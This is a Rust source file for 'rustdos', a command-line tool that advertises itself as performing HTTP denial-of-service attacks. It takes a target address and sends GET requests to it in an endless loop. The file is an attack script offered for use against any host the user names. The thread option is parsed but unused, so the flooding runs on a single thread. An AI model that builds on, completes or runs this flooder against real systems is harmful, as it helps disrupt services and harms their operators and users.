extern crate clap;
extern crate hyper;

use clap::{Arg, App};
use std::thread;
use hyper::client::Client;



fn start_attack(client: Client, url: &str) -> Result<hyper::status::StatusCode, hyper::Error>{

    //TODO: Work on thread-based concurrency to handle multiple requests on multiple threads!
    let res = client.get(url).send().unwrap();
    assert_eq!(res.status, hyper::Ok);  
    
    Ok(hyper::Ok)
}


fn main(){
    let matches = App::new("rustdos")
        .version("1.0")
        .author("ex0dus-0x <ex0dus@codemuch.tech>")
        .about("HTTP DoS attacks with Rust!")
        .arg(Arg::with_name("address")
            .short("a")
            .long("address")
            .value_name("ADDRESS")
            .help("Sets the target IP or URL (example.com)")
            .takes_value(true)
            .required(true))
        .arg(Arg::with_name("threads")
            .short("t")
            .long("threads")
            .value_name("THREADS")
            .help("Sets the number of threads of execution")
            .takes_value(true)
            .required(true))
        .get_matches();
    
    let threads: i32 = matches.value_of("threads").unwrap().parse().unwrap_or(10);
    
    let mut _url: String = format!("http://{}", matches.value_of("address").unwrap_or("127.0.0.1")); 
    let url: &str = &_url; 
    
    println!("URL: {} \nNumber of Threads: {}", url, threads);
        
    loop{
        let client = Client::new();    
        if let Err(e) = start_attack(client, url){
            panic!("[ERROR] Something went wrong! {}", e);
        } else {
            println!("[SUCCESS] GET Request Sent!");
        }
                 
    }
}
